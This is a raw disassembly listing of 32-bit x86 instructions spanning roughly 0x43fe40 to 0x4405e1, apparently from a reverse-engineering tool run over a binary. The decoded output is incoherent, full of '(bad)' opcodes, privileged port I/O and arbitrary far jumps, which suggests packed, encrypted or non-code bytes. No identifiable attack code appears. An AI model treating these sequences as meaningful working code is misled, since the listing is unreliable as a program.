  43fe40:	imul   esp,DWORD PTR [eax+0x5d],0x8406e77d
  43fe47:	sbb    ecx,0xfffffffb
  43fe4a:	out    dx,al
  43fe4b:	mov    ah,0xec
  43fe4d:	cli    
  43fe4e:	daa    
  43fe4f:	fxch   st(4)
  43fe51:	fimul  DWORD PTR [esi-0x5d]
  43fe54:	in     eax,dx
  43fe55:	cmp    al,BYTE PTR [ebx-0x3143deac]
  43fe5b:	mov    bh,0xba
  43fe5d:	(bad)  
  43fe5e:	out    0x82,eax
  43fe60:	je     0x43febe
  43fe62:	repnz gs pop esi
  43fe65:	jmp    0x2982:0x5355fb40
  43fe6c:	jp     0x43fe94
  43fe6e:	out    dx,al
  43fe6f:	mul    BYTE PTR [ecx+0x36b11ddb]
  43fe75:	jp     0x43fe2f
  43fe77:	and    BYTE PTR [ebp+0x77834909],dh
  43fe7d:	cmp    BYTE PTR [esp+eiz*4-0x5b2af04],al
  43fe84:	xchg   edx,eax
  43fe85:	xor    al,0x56
  43fe87:	add    DWORD PTR [ebp-0x5f],eax
  43fe8a:	(bad)  
  43fe8b:	cmp    esi,eax
  43fe8d:	pusha  
  43fe8e:	(bad)  
  43fe8f:	stos   DWORD PTR es:[edi],eax
  43fe90:	aad    0xb
  43fe92:	push   ds
  43fe93:	je     0x43fede
  43fe95:	popa   
  43fe96:	adc    al,0xec
  43fe98:	mov    ebx,0xb79efedd
  43fe9d:	jns    0x43fe8d
  43fe9f:	mov    ch,0x22
  43fea1:	aad    0x3
  43fea3:	cmp    dh,BYTE PTR [eax-0x655e7580]
  43fea9:	mov    al,0xbc
  43feab:	jecxz  0x43feb5
  43fead:	in     al,0xde
  43feaf:	jp     0x43ff0f
  43feb1:	and    DWORD PTR ds:0x781456c5,ebx
  43feb7:	sub    al,0x29
  43feb9:	popa   
  43feba:	dec    ecx
  43febb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43febc:	fbld   TBYTE PTR [edx+edi*1-0x2f]
  43fec0:	gs stos DWORD PTR es:[edi],eax
  43fec2:	out    dx,al
  43fec3:	or     DWORD PTR [edi-0x6e9b0f82],0x21a1a2f3
  43fecd:	sub    DWORD PTR [edi-0x4c4b27ce],esp
  43fed3:	and    bl,BYTE PTR [esi+0x59]
  43fed6:	jg     0x43fece
  43fed8:	fcomp  QWORD PTR [edx+0x4c]
  43fedb:	jo     0x43fea4
  43fedd:	push   edi
  43fede:	ret    0x1a99
  43fee1:	add    ebp,DWORD PTR [esi+0x56]
  43fee4:	ds push edx
  43fee6:	dec    edi
  43fee7:	cwde   
  43fee8:	xor    al,0x7d
  43feea:	fsub   QWORD PTR [ecx]
  43feec:	add    eax,0x2db6c98a
  43fef1:	mov    bh,0xde
  43fef3:	jo     0x43fef3
  43fef5:	pusha  
  43fef6:	mov    eax,0x47ee131d
  43fefb:	pop    ds
  43fefc:	cld    
  43fefd:	(bad)  
  43fefe:	cmc    
  43feff:	sub    edi,DWORD PTR [edx-0x3c]
  43ff02:	xchg   ebx,eax
  43ff03:	mov    eax,ds:0xfdbb258e
  43ff08:	mov    ebx,0xdd9f5d60
  43ff0d:	cmp    ecx,DWORD PTR [edi-0x42]
  43ff10:	sub    eax,0x1672eec6
  43ff15:	in     eax,dx
  43ff16:	pop    ss
  43ff17:	aad    0x14
  43ff19:	outs   dx,BYTE PTR ds:[esi]
  43ff1a:	mov    ah,0x7a
  43ff1c:	xchg   esi,eax
  43ff1d:	pop    esi
  43ff1e:	mov    al,BYTE PTR [ecx-0x33]
  43ff21:	dec    esi
  43ff22:	adc    al,0x61
  43ff24:	jle    0x43feec
  43ff26:	xchg   edi,eax
  43ff27:	push   cs
  43ff28:	pop    esi
  43ff29:	shl    BYTE PTR [edi-0x3f],0x3f
  43ff2d:	mov    ah,0x71
  43ff2f:	mov    ch,0xf0
  43ff31:	pusha  
  43ff32:	cdq    
  43ff33:	sti    
  43ff34:	mov    al,0xd6
  43ff36:	in     al,dx
  43ff37:	push   ebp
  43ff38:	mov    edx,0x7c26ee75
  43ff3d:	or     BYTE PTR [ebx+ecx*2],0x28
  43ff41:	mov    esi,0xdd7aaafb
  43ff46:	outs   dx,BYTE PTR ds:[esi]
  43ff47:	test   al,0xf5
  43ff49:	pop    ebp
  43ff4a:	pop    ds
  43ff4b:	jecxz  0x43ff89
  43ff4d:	or     DWORD PTR [eax],0xe7be7955
  43ff53:	pop    ebx
  43ff54:	(bad)  
  43ff55:	in     eax,0xae
  43ff57:	and    esp,DWORD PTR [esi]
  43ff59:	(bad)  
  43ff5a:	fwait
  43ff5b:	mov    ds:0x8a581692,eax
  43ff60:	lods   eax,DWORD PTR ds:[esi]
  43ff61:	pop    edx
  43ff62:	fldenv [eax-0x2b0ad02]
  43ff68:	test   BYTE PTR [eax-0x76],ah
  43ff6b:	call   DWORD PTR [ebx]
  43ff6d:	push   ebp
  43ff6e:	inc    edx
  43ff6f:	and    DWORD PTR [ecx+0x2b4fed61],esi
  43ff75:	out    0x94,eax
  43ff77:	or     al,0xdd
  43ff79:	in     eax,dx
  43ff7a:	xor    ah,BYTE PTR [eax-0x1980a3d0]
  43ff80:	gs and eax,0x21c9a146
  43ff86:	xor    eax,DWORD PTR [edx+0x67ee75d4]
  43ff8c:	test   DWORD PTR [ebp-0x74],ecx
  43ff8f:	mov    eax,0xa10fec80
  43ff94:	cmp    dh,BYTE PTR ds:0x22f9e367
  43ff9a:	jbe    0x43ff5f
  43ff9c:	push   edx
  43ff9d:	call   0x43e3:0x119db6b5
  43ffa4:	pop    ebp
  43ffa5:	(bad)  
  43ffa6:	sub    eax,0xa2851ef0
  43ffab:	push   ebx
  43ffac:	test   eax,0x820f4860
  43ffb1:	mov    esi,0x784d29f3
  43ffb6:	jmp    0x9d99:0x1a4c4cf4
  43ffbd:	pop    es
  43ffbe:	sub    DWORD PTR [esi-0x12],ebp
  43ffc1:	scas   eax,DWORD PTR es:[edi]
  43ffc2:	mov    al,ds:0x4502a9a8
  43ffc7:	lods   al,BYTE PTR ds:[esi]
  43ffc8:	shl    DWORD PTR [eax],cl
  43ffca:	cmp    BYTE PTR [eax+0x6a],bl
  43ffcd:	or     eax,0x820db5ee
  43ffd2:	sets   BYTE PTR [esi-0x6f681e0c]
  43ffd9:	jmp    0x9557:0x11e2a2a3
  43ffe0:	ffree  st(0)
  43ffe2:	pop    ecx
  43ffe3:	add    al,0x5e
  43ffe5:	xor    DWORD PTR [esi],ecx
  43ffe7:	cs pusha 
  43ffe9:	scas   al,BYTE PTR es:[edi]
  43ffea:	(bad)
  43ffee:	ret    0xe2a2
  43fff1:	dec    edx
  43fff2:	int3   
  43fff3:	mov    eax,0xe4cb801b
  43fff8:	(bad)  
  43fff9:	mov    bh,0x61
  43fffb:	rcr    DWORD PTR [esi+0x45],0x80
  43ffff:	test   DWORD PTR [esi],ebp
  440001:	push   esi
  440002:	mov    ecx,0x4ebb3244
  440007:	mov    eax,ds:0xfa044e16
  44000c:	ja     0x44001f
  44000e:	vpunpcklbw ymm3,ymm4,YMMWORD PTR [edx-0x73]
  440013:	jnp    0x43ffbc
  440015:	pushf  
  440016:	sahf   
  440017:	cmp    edi,0x72a0e570
  44001d:	repnz sbb al,0x84
  440020:	or     eax,esi
  440022:	mov    esp,0x47cd5ecc
  440027:	scas   al,BYTE PTR es:[edi]
  440028:	pop    ebp
  440029:	or     ebx,eax
  44002b:	pop    edx
  44002c:	xchg   edx,eax
  44002d:	pusha  
  44002e:	mov    edi,0x5b740ada
  440033:	xchg   edi,eax
  440034:	lods   al,BYTE PTR ds:[esi]
  440035:	and    al,0xee
  440037:	push   0xfffffff6
  440039:	(bad)  
  44003a:	stos   DWORD PTR es:[edi],eax
  44003b:	mov    ds:0xc51b96da,eax
  440040:	mov    eax,0x94a10e01
  440045:	sbb    DWORD PTR [edx],0xee3c425d
  44004b:	mov    ebx,0xceda341d
  440050:	cld    
  440051:	dec    ecx
  440052:	shl    DWORD PTR [edx+0x4f],cl
  440055:	pusha  
  440056:	jl     0x440036
  440058:	jp     0x44002d
  44005a:	pop    ecx
  44005b:	cs pop esp
  44005d:	mov    ebp,0x71635f88
  440062:	xchg   BYTE PTR [eax-0x62403f5b],bl
  440068:	push   cs
  440069:	out    0xdf,al
  44006b:	scas   al,BYTE PTR es:[edi]
  44006c:	pop    eax
  44006d:	(bad)  
  44006e:	outs   dx,BYTE PTR ds:[esi]
  44006f:	xchg   ebx,eax
  440070:	lds    esi,FWORD PTR [esi+0x7d119af5]
  440076:	loopne 0x44004a
  440078:	push   ss
  440079:	inc    ebx
  44007a:	mov    eax,ds:0xed923e8d
  44007f:	xor    DWORD PTR [ecx-0x3f],ebx
  440082:	test   DWORD PTR [edx],ebx
  440084:	call   0x3389:0x2da0b703
  44008b:	mov    bh,0x34
  44008d:	inc    ebx
  44008e:	mov    bl,0x3e
  440090:	fstp   DWORD PTR ss:[eax+0x22]
  440094:	(bad)  
  440095:	shl    DWORD PTR [ecx],cl
  440097:	int3   
  440098:	(bad)  
  440099:	xchg   edi,eax
  44009a:	data16 jae 0x4400ba
  44009d:	push   ebx
  44009e:	fsubr  QWORD PTR [ebx]
  4400a0:	push   ecx
  4400a1:	jp     0x440071
  4400a3:	xchg   ebp,eax
  4400a4:	xchg   DWORD PTR [ebp-0x71],edx
  4400a7:	mov    ebx,0x1108aa7e
  4400ac:	mov    ch,0x9a
  4400ae:	out    dx,al
  4400af:	sub    al,0x94
  4400b1:	ja     0x44004f
  4400b3:	mov    fs,WORD PTR [ebx+0x61]
  4400b6:	rcl    DWORD PTR [ecx+esi*4-0x59],1
  4400ba:	jmp    0x7ce1:0x2e0a5b66
  4400c1:	xchg   ecx,eax
  4400c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4400c3:	xchg   ebx,eax
  4400c4:	repnz inc ecx
  4400c6:	shr    ebp,0x6e
  4400c9:	and    BYTE PTR [esi-0x78],dh
  4400cc:	in     eax,dx
  4400cd:	dec    esp
  4400ce:	mov    edx,ecx
  4400d0:	mov    dh,0x45
  4400d2:	fisub  WORD PTR [esi+ebx*2+0x64]
  4400d6:	sar    ch,0x15
  4400d9:	adc    esp,ecx
  4400db:	test   al,0x86
  4400dd:	pop    edi
  4400de:	mov    ch,0x38
  4400e0:	es pushf 
  4400e2:	add    ch,bh
  4400e4:	nop
  4400e5:	mov    al,ds:0x4f5e56c7
  4400ea:	(bad)  
  4400eb:	lock arpl WORD PTR [ebx-0x3d],bx
  4400ef:	lea    esp,[esi+0x1688d860]
  4400f5:	nop
  4400f6:	xchg   edi,ebp
  4400f8:	dec    ebx
  4400f9:	jmp    0x36e3:0x3a3c77ee
  440100:	arpl   sp,bp
  440102:	cmp    DWORD PTR [ecx],esi
  440104:	push   0x2f27861
  440109:	push   ecx
  44010a:	psllq  mm3,QWORD PTR [edi]
  44010d:	xchg   ebx,eax
  44010e:	jmp    0xb815ecf3
  440113:	imul   ebx,DWORD PTR [esi-0x489a8151],0x6d9e145b
  44011d:	jnp    0x440122
  44011f:	bound  edx,QWORD PTR [ebx-0x493f0c92]
  440125:	push   0x61454224
  44012a:	mov    edi,0x64fb7334
  44012f:	loopne 0x440175
  440131:	popa   
  440132:	adc    al,0x1d
  440134:	pop    eax
  440135:	jle    0x440126
  440137:	jo     0x440199
  440139:	(bad)  
  44013b:	jne    0x440197
  44013d:	(bad)  [eax]
  44013f:	sar    BYTE PTR [ebx-0x2d9f107a],cl
  440145:	mov    esp,0x5e646700
  44014a:	pop    esp
  44014b:	push   0xffffffa1
  44014d:	inc    ebx
  44014e:	mov    eax,0xe9f1de21
  440153:	ja     0x4401ca
  440155:	nop
  440156:	dec    esi
  440157:	arpl   WORD PTR ss:[edx+ebp*1-0x510e0e4e],si
  44015f:	mov    al,ds:0x6a48e180
  440164:	cwde   
  440165:	pop    ecx
  440166:	mov    bl,0x81
  440168:	xor    ecx,DWORD PTR [edx+esi*2-0x1f]
  44016c:	hlt    
  44016d:	add    al,0xe4
  44016f:	pop    ebx
  440170:	lods   al,BYTE PTR es:[esi]
  440172:	pusha  
  440173:	mov    eax,ds:0x8bb9901
  440178:	and    BYTE PTR [ecx+0x20],al
  44017b:	mov    eax,ds:0x77cfa8b9
  440180:	mov    ebx,0xbea2044b
  440185:	sar    BYTE PTR [eax+0x602d5eaa],0x13
  44018c:	or     esi,DWORD PTR [edx+ebx*4+0x1b]
  440190:	das    
  440191:	and    esp,DWORD PTR [ebx-0x14]
  440194:	push   es
  440195:	pusha  
  440196:	les    eax,FWORD PTR [eax]
  440198:	or     DWORD PTR [ebx],ecx
  44019a:	push   edx
  44019b:	dec    ebx
  44019c:	ss cwde 
  44019e:	push   edi
  44019f:	dec    ecx
  4401a0:	xor    DWORD PTR [eax],0xffffffee
  4401a3:	scas   al,BYTE PTR es:[edi]
  4401a4:	daa    
  4401a5:	push   cs
  4401a6:	inc    edi
  4401a7:	aaa    
  4401a8:	push   ecx
  4401a9:	or     eax,0xa314a3d5
  4401ae:	sub    bh,BYTE PTR [ecx-0x44]
  4401b1:	mov    dh,0x66
  4401b3:	inc    edx
  4401b4:	push   ds
  4401b5:	jns    0x4401a5
  4401b7:	jle    0x44014b
  4401b9:	jae    0x4401cd
  4401bb:	dec    ebx
  4401bc:	les    ecx,FWORD PTR [ebp-0x3e]
  4401bf:	mov    al,ds:0x6e315083
  4401c4:	fxch   st(2)
  4401c6:	cmc    
  4401c7:	inc    ecx
  4401c8:	push   esp
  4401c9:	inc    ebx
  4401ca:	push   ebp
  4401cb:	fwait
  4401cc:	fwait
  4401cd:	(bad)  
  4401ce:	mov    ebp,0xca906e6b
  4401d3:	xor    esp,DWORD PTR [edi+0x57b5260]
  4401d9:	pushf  
  4401da:	xor    al,BYTE PTR [eax]
  4401dc:	or     dl,ch
  4401de:	out    dx,al
  4401df:	dec    ecx
  4401e0:	retf   0xc3be
  4401e3:	les    ecx,FWORD PTR [ebp+0x3c]
  4401e6:	sub    BYTE PTR [edi+0x1f2d975d],bl
  4401ec:	mov    cl,0xd9
  4401ee:	in     eax,0xb6
  4401f0:	jp     0x4401d2
  4401f2:	jge    0x44021c
  4401f4:	jnp    0x440229
  4401f6:	out    dx,al
  4401f7:	loope  0x440210
  4401f9:	gs ins BYTE PTR es:[edi],dx
  4401fb:	into   
  4401fc:	mov    ch,0xe5
  4401fe:	cs jns 0x440205
  440201:	dec    edx
  440202:	cmp    al,0x3a
  440204:	cmp    ah,BYTE PTR [ecx-0x5c]
  440207:	test   DWORD PTR [edx+0x5e1e846e],esp
  44020d:	cmc    
  44020e:	fwait
  44020f:	push   ebp
  440210:	add    eax,0xd2708947
  440215:	pusha  
  440216:	popf   
  440217:	fcomp  DWORD PTR [ebx-0x4c]
  44021a:	cmc    
  44021b:	jno    0x4401e1
  44021d:	jmp    0x3092:0xbe67a601
  440224:	pop    esi
  440225:	sbb    bh,BYTE PTR [ecx]
  440227:	es ret 0x2fa7
  44022b:	mov    eax,ds:0x31a9627c
  440230:	dec    eax
  440231:	loope  0x4401ef
  440233:	data16 lahf 
  440235:	mov    eax,0xe23fcb26
  44023a:	sub    esp,DWORD PTR [edi-0x20db2f3d]
  440240:	jmp    0x4402a3
  440242:	dec    ebx
  440243:	pop    esp
  440244:	fiadd  WORD PTR [ebx]
  440246:	mov    ah,BYTE PTR [ebp+0x72972b88]
  44024c:	sub    BYTE PTR fs:[eax],dl
  44024f:	and    BYTE PTR [ecx+0x43a264cc],bh
  440255:	adc    dh,dh
  440257:	mov    ds:0x825381f1,al
  44025c:	pop    ebp
  44025d:	dec    ebp
  44025e:	into   
  44025f:	jl     0x440243
  440261:	pusha  
  440262:	out    0x92,eax
  440264:	aaa    
  440265:	jo     0x4401f3
  440267:	aaa    
  440268:	imul   edx,DWORD PTR [ecx-0x12],0xffffffed
  44026c:	fldenv [edx-0xca9a7bb]
  440272:	dec    esi
  440273:	mov    eax,ds:0x84b41891
  440278:	xchg   esp,eax
  440279:	mov    cl,0xc4
  44027b:	lds    ebx,FWORD PTR [esi-0x20]
  44027e:	mov    esi,0xcec35c0
  440283:	in     eax,0xf9
  440285:	pusha  
  440286:	das    
  440287:	mov    ecx,0xe8cb47e0
  44028c:	sbb    bl,bl
  44028e:	add    ch,dh
  440290:	add    ch,BYTE PTR [eax]
  440292:	cs ins BYTE PTR es:[edi],dx
  440294:	add    edi,esi
  440296:	mov    al,ds:0x5a636986
  44029b:	or     DWORD PTR [ebx+0x69],ebx
  44029e:	add    BYTE PTR [edx],bh
  4402a0:	lods   eax,DWORD PTR ds:[esi]
  4402a1:	inc    ecx
  4402a2:	dec    ebp
  4402a3:	std    
  4402a4:	xlat   BYTE PTR ds:[ebx]
  4402a5:	out    0xb3,al
  4402a7:	push   eax
  4402a8:	push   ebx
  4402a9:	(bad)  
  4402aa:	out    dx,eax
  4402ab:	mov    eax,0x8145290b
  4402b0:	call   0x665:0xb58a1114
  4402b7:	test   eax,0xaffb915e
  4402bc:	addr16 retf 
  4402be:	xchg   esp,eax
  4402bf:	dec    esi
  4402c0:	pop    esi
  4402c1:	fdiv   DWORD PTR [ebp-0x56787871]
  4402c7:	loop   0x4402fa
  4402c9:	popa   
  4402ca:	iret   
  4402cb:	stos   BYTE PTR es:[edi],al
  4402cc:	push   edx
  4402cd:	inc    ebx
  4402ce:	std    
  4402cf:	push   ds
  4402d0:	add    al,0xe1
  4402d2:	jmp    0x44030d
  4402d4:	xor    ebx,esp
  4402d6:	das    
  4402d7:	mov    edx,0xbb66e13e
  4402dc:	cs mov ch,0xf5
  4402df:	lods   eax,DWORD PTR ds:[esi]
  4402e0:	xlat   BYTE PTR ds:[ebx]
  4402e1:	cmp    al,0x6e
  4402e3:	mov    dl,0xc1
  4402e5:	bound  edx,QWORD PTR [edx-0x4b]
  4402e8:	xchg   BYTE PTR [edi],cl
  4402ea:	add    BYTE PTR [ecx],dl
  4402ec:	call   0x5b0f70f3
  4402f1:	in     eax,0xaa
  4402f3:	xor    ebp,ebx
  4402f5:	test   al,0x2e
  4402f7:	mov    eax,ds:0x4fda7ae0
  4402fc:	fs daa 
  4402fe:	inc    edi
  4402ff:	add    BYTE PTR [esi-0x55],bl
  440302:	out    0xfd,al
  440304:	or     DWORD PTR [eax+0x5b],0xffffffa0
  440308:	mov    dl,0x18
  44030a:	in     eax,dx
  44030b:	pop    esi
  44030c:	pop    esi
  44030d:	jae    0x440362
  44030f:	aam    0x70
  440311:	inc    ebp
  440312:	int    0xe6
  440314:	pop    ebp
  440315:	mov    bl,bl
  440317:	mov    cl,0x89
  440319:	scas   eax,DWORD PTR es:[edi]
  44031a:	(bad)  
  44031b:	std    
  44031c:	sub    bl,0x4f
  44031f:	mov    eax,ds:0xc723f448
  440324:	pop    esp
  440325:	mov    eax,0xca5e822c
  44032a:	out    0x1e,al
  44032c:	int    0x7e
  44032e:	adc    BYTE PTR [ebp-0x5d],cl
  440331:	pusha  
  440332:	xchg   esp,eax
  440333:	and    eax,0xee8ed4b0
  440338:	add    esi,ecx
  44033a:	idiv   DWORD PTR [edi+eiz*1]
  44033d:	(bad)  
  44033e:	out    dx,al
  44033f:	inc    ecx
  440340:	xor    al,0x12
  440342:	dec    esp
  440343:	clc    
  440344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440345:	pusha  
  440346:	xchg   ebx,eax
  440347:	nop
  440348:	aas    
  440349:	scas   eax,DWORD PTR es:[edi]
  44034a:	outs   dx,DWORD PTR ds:[esi]
  44034b:	push   ds
  44034c:	xor    DWORD PTR [edi],ebx
  44034e:	push   ds
  44034f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440350:	and    eax,0xa342326f
  440355:	pusha  
  440356:	dec    ebp
  440357:	repz imul ebx,DWORD PTR [esi+0x67],0xee699f37
  44035f:	and    eax,ebp
  440361:	call   0x70d572dd
  440366:	int3   
  440367:	lock add DWORD PTR [ecx-0xc],esp
  44036b:	add    eax,0x8a64f963
  440370:	dec    esp
  440371:	jo     0x440353
  440373:	ss pop esi
  440375:	or     BYTE PTR [esi],cl
  440377:	xor    BYTE PTR [edi+0x22da3b8f],bh
  44037d:	dec    ebx
  44037e:	xor    al,0xd3
  440380:	inc    ecx
  440381:	popa   
  440382:	(bad)  
  440383:	mov    BYTE PTR [edx+0x75],dh
  440386:	and    BYTE PTR [eax],cl
  440388:	pop    ebx
  440389:	jle    0x44030c
  44038b:	add    ah,dl
  44038d:	inc    eax
  44038e:	into   
  44038f:	pop    esi
  440390:	mov    ss,WORD PTR [ecx-0x76]
  440393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440395:	iret   
  440396:	or     bh,BYTE PTR [edx-0x3281a6f2]
  44039c:	push   ebp
  44039d:	test   eax,0xdf75f7ee
  4403a2:	pop    ss
  4403a3:	addr16 pusha 
  4403a5:	fsubrp st(3),st
  4403a7:	mov    al,ds:0x4db54571
  4403ac:	mov    BYTE PTR [ecx-0x4f84cf68],al
  4403b2:	jne    0x4403b9
  4403b4:	xor    eax,0x64ebad23
  4403b9:	mov    ss,WORD PTR [esi]
  4403bb:	jp     0x4403ac
  4403bd:	sbb    al,0x5f
  4403bf:	xlat   BYTE PTR ds:[ebx]
  4403c0:	sahf   
  4403c1:	call   0x612fa5e0
  4403c6:	cdq    
  4403c7:	mov    al,ds:0xa807ca8
  4403cc:	dec    eax
  4403cd:	cmp    eax,0x17cd7fee
  4403d2:	in     al,dx
  4403d3:	aad    0xe9
  4403d5:	adc    BYTE PTR [eax+eiz*4+0x6bb000bb],ch
  4403dc:	into   
  4403dd:	mov    eax,ds:0x865e7de6
  4403e2:	stos   DWORD PTR es:[edi],eax
  4403e3:	jp     0x4403f6
  4403e5:	icebp  
  4403e6:	dec    ebx
  4403e7:	cmp    ebp,DWORD PTR [eax-0x53]
  4403ea:	setg   BYTE PTR [edx-0x53]
  4403ee:	or     BYTE PTR [esi],al
  4403f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4403f1:	outs   dx,DWORD PTR ds:[esi]
  4403f2:	dec    esi
  4403f3:	test   al,0x75
  4403f5:	xchg   ebp,eax
  4403f6:	add    cl,BYTE PTR [ebx+0x16]
  4403f9:	sub    BYTE PTR [ebp+0x50191a0],ch
  4403ff:	js     0x44045a
  440401:	loopne 0x4403e0
  440403:	mov    eax,ds:0xc28ad9b8
  440408:	sar    DWORD PTR [edi],cl
  44040a:	push   esi
  44040b:	and    DWORD PTR [esi],ecx
  44040d:	lock jne 0x44039b
  440410:	imul   esi,DWORD PTR [eax-0x6bf85eed],0xfffffffc
  440417:	inc    ebp
  440418:	mov    al,0x61
  44041a:	push   edx
  44041b:	pushf  
  44041c:	pop    esi
  44041d:	dec    edx
  44041e:	sahf   
  44041f:	xchg   ecx,eax
  440420:	jno    0x4403c3
  440422:	push   ebx
  440423:	or     DWORD PTR [ebx+0x53],eax
  440426:	xor    BYTE PTR [edi+0x7f],al
  440429:	jb     0x4403d9
  44042b:	mov    bh,0x4
  44042d:	mov    DWORD PTR [edx],eax
  44042f:	in     eax,0x5f
  440431:	pop    edx
  440432:	and    bl,BYTE PTR [ebp-0x72]
  440435:	add    DWORD PTR [ebx+0x1bb91571],edx
  44043b:	mov    eax,ds:0x58113043
  440440:	mov    bl,BYTE PTR [edi+eiz*4-0x57]
  440444:	pop    edx
  440445:	jo     0x44049a
  440447:	les    ebp,FWORD PTR [edx+0x48]
  44044a:	mov    BYTE PTR cs:[ecx],dl
  44044d:	sahf   
  44044e:	scas   al,BYTE PTR es:[edi]
  44044f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440451:	jp     0x4403f1
  440453:	es cld 
  440455:	mov    ch,0x6e
  440457:	and    BYTE PTR [edx-0x44],cl
  44045a:	dec    esi
  44045b:	clc    
  44045c:	call   0x1103:0xf7037160
  440463:	ret    0xb907
  440466:	loope  0x440444
  440468:	pop    edi
  440469:	mov    eax,ds:0xe2a45232
  44046e:	dec    eax
  44046f:	dec    ecx
  440470:	mov    fs,WORD PTR [ecx+0x77fba0bb]
  440476:	js     0x4404e0
  440478:	bound  esp,QWORD PTR [esi]
  44047a:	xchg   esi,eax
  44047b:	(bad)  
  44047c:	out    dx,al
  44047d:	gs in  eax,0x73
  440480:	pop    esi
  440481:	nop
  440482:	lock in al,0x55
  440485:	inc    ecx
  440486:	mov    edx,DWORD PTR [edi*2+0x3290f95f]
  44048d:	pop    edi
  44048e:	enter  0xc3d,0xc1
  440492:	adc    eax,0x4e875ee0
  440497:	fistp  DWORD PTR [esp+edi*2-0x7d]
  44049b:	lock pushf 
  44049d:	inc    esp
  44049e:	xchg   ebp,eax
  44049f:	inc    ebp
  4404a0:	lock out 0x6e,al
  4404a3:	xlat   BYTE PTR ds:[ebx]
  4404a4:	rol    dh,cl
  4404a6:	cmp    BYTE PTR [ebx-0x6116f8c],0xe8
  4404ad:	imul   ebp,DWORD PTR [edi-0x544a1c44],0xffffffa1
  4404b4:	js     0x4404ec
  4404b6:	repnz ror DWORD PTR [ecx+0x52],1
  4404ba:	cmp    BYTE PTR [ecx+0x47ee0177],dh
  4404c0:	inc    DWORD PTR [ecx+0x10]
  4404c3:	(bad)  
  4404c4:	and    dl,BYTE PTR [ebx]
  4404c6:	test   al,0x7e
  4404c8:	test   DWORD PTR [eax+0x6d],esp
  4404cb:	push   0x75f76eba
  4404d0:	and    BYTE PTR [eax],bl
  4404d2:	out    dx,al
  4404d3:	nop
  4404d4:	fdivr  st,st(2)
  4404d6:	mov    ah,0x6c
  4404d8:	fcom   QWORD PTR ds:0x82a6a52e
  4404de:	xor    eax,0x5cdd8e1e
  4404e3:	xchg   ebx,eax
  4404e4:	(bad)  
  4404e5:	in     eax,dx
  4404e6:	nop
  4404e7:	cmp    al,0x5e
  4404e9:	jmp    0x4404cc
  4404eb:	mov    dh,0xe7
  4404ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4404ee:	inc    eax
  4404ef:	jge    0x440472
  4404f1:	pusha  
  4404f2:	or     DWORD PTR [ebx],eax
  4404f4:	xor    esp,DWORD PTR [ecx+0x2f9880a0]
  4404fa:	mov    dh,0x79
  4404fc:	fbld   TBYTE PTR [eax-0x4e]
  4404ff:	sbb    ch,BYTE PTR [edi+0x1c402f64]
  440505:	popa   
  440506:	inc    ebx
  440507:	in     eax,dx
  440508:	pop    ss
  440509:	sub    al,0xed
  44050b:	aad    0xd5
  44050d:	fbld   TBYTE PTR [edx+esi*2+0x5e]
  440511:	adc    bh,dh
  440513:	out    dx,eax
  440514:	(bad)  
  440515:	sbb    DWORD PTR [ecx+0x3072a7cf],eax
  44051b:	xor    bh,BYTE PTR [ebp+0x60]
  44051e:	aas    
  44051f:	cmp    eax,0xfb379c5b
  440524:	pop    edi
  440525:	dec    edi
  440526:	add    eax,ebx
  440528:	retf   0x9a19
  44052b:	dec    ecx
  44052c:	call   0xf2ed:0xe0a0edf8
  440533:	rcl    cl,1
  440535:	mov    BYTE PTR [esi],cl
  440537:	in     al,0x5e
  440539:	sbb    BYTE PTR [ebx+0x6252dd7e],bh
  44053f:	js     0x440585
  440541:	popa   
  440542:	push   ss
  440543:	je     0x440590
  440545:	neg    edx
  440547:	stos   DWORD PTR es:[edi],eax
  440548:	scas   al,BYTE PTR es:[edi]
  440549:	inc    ecx
  44054a:	ret    0x611b
  44054d:	das    
  44054e:	out    dx,al
  44054f:	xlat   BYTE PTR ds:[ebx]
  440550:	jns    0x440543
  440552:	add    BYTE PTR [edx+0x73],dh
  440555:	call   0xdb74:0xd7c0a206
  44055c:	stc    
  44055d:	jo     0x44051a
  44055f:	add    BYTE PTR [ebp+0x7061ed74],ah
  440565:	mov    ecx,0xacfd097
  44056a:	pop    esi
  44056b:	add    BYTE PTR [ebp-0x56799aa0],bh
  440571:	xchg   esp,esp
  440573:	mov    dh,0x84
  440575:	jb     0x440563
  440577:	xchg   BYTE PTR [eax-0x7f],dl
  44057a:	sub    ebx,ebx
  44057c:	adc    ecx,eax
  44057e:	pop    esp
  44057f:	cmp    DWORD PTR [ecx+ebp*2],ecx
  440582:	shl    WORD PTR [esi+edi*8+0x54],1
  440587:	mov    es,WORD PTR ds:0x39dcef01
  44058d:	jne    0x44060c
  44058f:	arpl   WORD PTR es:[ecx-0x41],si
  440593:	gs loope 0x4405f6
  440596:	ret    
  440597:	not    esi
  440599:	dec    ebx
  44059a:	mov    eax,ss:0x1f2aeb64
  4405a0:	cld    
  4405a1:	test   DWORD PTR [esi+0x6f],ebx
  4405a4:	pop    esi
  4405a5:	out    dx,eax
  4405a6:	inc    ebp
  4405a7:	lods   eax,DWORD PTR ds:[esi]
  4405a8:	mov    bl,BYTE PTR [edx+0x55cacbf6]
  4405ae:	sbb    ah,al
  4405b0:	xchg   ebx,eax
  4405b1:	daa    
  4405b2:	lock bound edi,QWORD PTR [esi]
  4405b5:	iret   
  4405b6:	mov    esp,0xee3d7311
  4405bb:	std    
  4405bc:	inc    ebx
  4405bd:	imul   edx,DWORD PTR [edx+0xc5db003],0xe4c00aa1
  4405c7:	mov    DWORD PTR [esp+ecx*8+0x655e99d5],edx
  4405ce:	mov    dh,0x1c
  4405d0:	scas   al,BYTE PTR es:[edi]
  4405d1:	jne    0x4405c0
  4405d3:	outs   dx,DWORD PTR ds:[esi]
  4405d4:	inc    ebp
  4405d5:	popa   
  4405d6:	sbb    bl,BYTE PTR [ecx]
  4405d8:	retf   
  4405d9:	dec    ecx
  4405da:	dec    ecx
  4405db:	icebp  
  4405dc:	mov    edx,0x1886eee8
  4405e1:	cs jmp 0x4405c4
